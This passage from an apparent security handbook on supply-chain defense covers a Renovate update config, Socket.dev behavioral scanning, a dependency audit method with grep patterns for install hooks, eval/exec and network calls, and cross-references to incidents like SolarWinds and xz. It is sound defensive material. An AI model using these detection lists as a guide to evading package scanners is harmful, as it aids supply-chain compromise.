      "automergeType": "pr",
      "requiredStatusChecks": ["ci/test", "ci/lint"]
    },
    {
      "matchUpdateTypes": ["major"],
      "labels": ["breaking-change"],
      "reviewers": ["team:security"],
      "automerge": false
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"],
    "reviewers": ["team:security"]
  },
  "postUpdateOptions": ["npmDedupe"]
}
```

**Socket.dev — behavioral analysis for npm/PyPI packages:**

Socket.dev analyzes packages for behavioral signals (network access, filesystem access, shell execution, environment variable reads, obfuscated code) that correlate with malicious intent. Unlike traditional CVE-based scanning, Socket detects zero-day supply chain attacks by flagging suspicious behavior in new package versions before a CVE is assigned.

```bash
# Install Socket CLI
npm install -g @socketsecurity/cli

# Analyze a project's dependencies for supply chain risk
socket report create --repo . --format json > socket-report.json

# Check for specific behavioral alerts
jq '.issues[] | select(.severity == "critical" or .severity == "high")' socket-report.json
```

### 9.4 Third-party code audit methodology

Not every dependency warrants a full audit. Triage based on risk:

| Risk Factor | Weight | Criteria |
|-------------|--------|----------|
| **Criticality** | HIGH | Runs in production, handles user data, auth, crypto, or network |
| **Privilege level** | HIGH | Runs with elevated permissions (root, kernel, build-time execution) |
| **Maintainer count** | MEDIUM | Bus factor of 1 = high risk (cf. xz utils, colors.js) |
| **OpenSSF Scorecard** | MEDIUM | Score < 5/10 = increased risk |
| **Code complexity** | MEDIUM | Large codebase with native extensions, FFI, or inline assembly |
| **Update frequency** | LOW | Dormant projects may have unpatched vulnerabilities |

**When to audit:**

1. **Before adoption** — for critical-path dependencies (auth libraries, crypto, serialization, ORM).
2. **On major version bumps** — review changelog, breaking changes, new dependencies introduced.
3. **On maintainer change** — new maintainer on a critical package warrants review of recent commits (cf. xz utils).
4. **On behavioral alert** — Socket.dev or Packj flags unexpected behavior in a new version.
5. **Periodically** — annual review of top-20 critical dependencies.

**Audit procedure:**

```bash
# 1. Clone and review recent commits
git clone https://github.com/vendor/package.git /tmp/audit-package
cd /tmp/audit-package
git log --oneline --since="2024-01-01" -- '*.js' '*.ts' '*.py' '*.c'

# 2. Check for install-time code execution
grep -rn "preinstall\|postinstall\|prepare" package.json
grep -rn "cmdclass\|entry_points.*console_scripts" setup.py setup.cfg pyproject.toml

# 3. Check for obfuscation or dynamic code execution
grep -rn "eval(\|exec(\|Function(\|__import__\|compile(" --include='*.js' --include='*.py' .

# 4. Check for network activity
grep -rn "fetch(\|XMLHttpRequest\|http\.request\|https\.request\|urllib\|requests\.\|socket\." \
  --include='*.js' --include='*.ts' --include='*.py' .

# 5. Review native extensions (if any)
find . -name '*.c' -o -name '*.cpp' -o -name '*.rs' -o -name 'binding.gyp' \
  | head -20

# 6. Check OpenSSF Scorecard
scorecard --repo=github.com/vendor/package --format=json \
  | jq '{score: .score, checks: [.checks[] | select(.score < 5) | {name: .name, score: .score}]}'
```

---

## 10. Cross-references

**To Domain 11 (malware):** SolarWinds SUNBURST used Cobalt Strike Beacon (Chapter 11A S5). TEARDROP and RAINDROP are custom in-memory loaders (Chapter 11A S3). The 3CX attack used DLL sideloading (Chapter 11A S1). The xz backdoor used IFUNC resolvers (Domain 1 Chapter 1B S2) — a binary-format primitive repurposed for supply-chain compromise. REvil ransomware deployment via Kaseya (Chapter 11A S6).

**To Domain 10 (cloud/container):** Container image signing (Sigstore/cosign) integrates with container registries (ECR, GCR, ACR). SBOM scanning applies to container images (scanning all layers' packages). Kubernetes admission controllers enforce image signature and provenance verification. Base image poisoning (S1.4) targets the container build pipeline.

**To Domain 14 (AD/Windows):** SolarWinds SUNBURST was used to compromise AD environments (DCSync, Golden Ticket, Golden SAML) in target organizations. Supply-chain attacks on enterprise software are the initial-access vector for many AD-focused attack campaigns. WDAC policies (S1.5.4) enforce code signing on Windows endpoints.

**To Domain 17 (physical):** Hardware Trojans (S4.2) and PCB implants (S4.3) are the physical-layer complement to software supply-chain attacks. PUF-based authentication (S4.1) is a side-channel property (Domain 17 S1) repurposed for defense. NSA ANT catalog represents state-level interdiction capabilities against hardware supply chains.

**To Domain 7 (web application):** XSS in Kaseya VSA (CVE-2021-30119) was part of the exploitation chain. Third-party script inclusion on web applications is a client-side supply chain vector. SRI (Subresource Integrity) and CSP mitigate JavaScript supply chain attacks in browsers.

**To Domain 2 (network):** DNS-based C2 used by SUNBURST (Domain 2 Chapter 2A S4). Network monitoring for supply chain IOCs requires deep packet inspection and DNS logging capabilities. CI/CD secret exfiltration typically uses HTTP(S) or DNS tunneling for data egress.
